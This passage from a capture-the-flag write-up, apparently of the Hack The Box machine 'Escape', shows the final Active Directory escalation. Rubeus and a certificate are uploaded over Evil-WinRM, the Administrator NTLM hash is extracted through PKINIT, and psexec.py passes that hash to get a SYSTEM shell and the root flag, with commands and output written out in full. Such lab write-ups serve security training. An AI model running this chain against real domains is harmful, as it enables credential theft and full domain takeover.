km+UDfnu+/shG97KAUuZnKdO8T27xL2vygg+g+++LBI/Sq+qPWn4oyNMHaroW+dm
/fIS2Mc1yZV7EgTuA4mJROMWMXSkbg==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:14.4161022
```

Uploading Rubeus to the domain controller.

```
*Evil-WinRM* PS C:\programdata> upload Rubeus.exe
Info: Uploading Rubeus.exe to C:\programdata\Rubeus.exe

                                                             
Data: 609620 bytes of 609620 bytes copied

Info: Upload successful!
```

Uploading the certificate to the domain controller after its been converted into the correct format.

```
*Evil-WinRM* PS C:\programdata> upload cert.pfx
Info: Uploading cert.pfx to C:\programdata\cert.pfx

                                                             
Data: 4376 bytes of 4376 bytes copied

Info: Upload successful!
```

Rubeus was able to use the certificate and expose the NTLM hash of the administrator user.

```
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:Administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::b5f7:99af:c8de:95da%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  7/14/2023 11:03:27 PM
  EndTime                  :  7/15/2023 9:03:27 AM
  RenewTill                :  7/21/2023 11:03:27 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  OP77zqcJBXBBFKZ3MNeozQ==
  ASREP (key)              :  8DA32F3799EA637A3DDA855D489BF4FD

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4CC
```

Logging in with psexec was possible using the NTLM hash. Administrator access achieved and the root user flag was captured.

```
┌─[✗]─[parrot@parrotos]─[~/htb/escape]
└──╼ $psexec.py -hashes A52F78E4C751E5F5E17E1E9F3E58F4CC:A52F78E4C751E5F5E17E1E9F3E58F4CC administrator@sequel.htb
Impacket v0.10.1.dev1+20230712.145931.275f4b97 - Copyright 2022 Fortra

[*] Requesting shares on sequel.htb.....
[*] Found writable share ADMIN$
[*] Uploading file RmPnDgna.exe
[*] Opening SVCManager on sequel.htb.....
[*] Creating service DhNt on sequel.htb.....
[*] Starting service DhNt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type c:\users\administrator\desktop\root.txt 
4a5f8e160e977486e699fdc363be1a2f

C:\Windows\system32> 
```